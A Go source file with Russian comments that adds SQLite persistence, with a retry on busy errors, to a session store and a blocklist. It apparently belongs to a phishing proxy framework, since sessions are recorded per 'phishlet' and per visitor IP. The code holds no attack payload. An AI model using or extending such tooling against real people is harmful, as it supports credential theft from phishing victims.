// Package sqlite — обертки персистентности (без vault, только факты).
// Ошибки НЕ глушатся: ретрай при SQLITE_BUSY + OnError хук (main wires log).
package sqlite

import (
	"context"
	"strings"
	"time"

	"github.com/phantom-v2/phantom/core"
)

// OnError по дефолту молчит (тесты), main ставит log.Printf.
var OnError = func(err error) {}

func withRetry(op func() error) {
	if err := op(); err == nil {
		return
	} else if isBusy(err) {
		time.Sleep(50 * time.Millisecond)
		if err2 := op(); err2 == nil {
			return
		} else {
			OnError(err2)
			return
		}
	} else {
		OnError(err)
	}
}

func isBusy(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "busy") || strings.Contains(s, "locked")
}

type SessionWrap struct {
	Inner core.SessionStore
	DB    *DB
}

func (w SessionWrap) Create(ctx context.Context, phishlet, ip string) (*core.Session, error) {
	sess, err := w.Inner.Create(ctx, phishlet, ip)
	if err != nil {
		return nil, err
	}
	withRetry(func() error { return w.DB.InsertSession(sess.ID, phishlet, ip) })
	return sess, nil
}

func (w SessionWrap) Get(ctx context.Context, id string) (*core.Session, error) {
	return w.Inner.Get(ctx, id)
}

type BlockWrap struct {
	Inner core.Blocklist
	DB    *DB
}

func (w BlockWrap) Block(key, reason string) {
	w.Inner.Block(key, reason)
	withRetry(func() error { return w.DB.InsertBlock(key, reason) })
}

func (w BlockWrap) Blocked(key string) bool { return w.Inner.Blocked(key) }
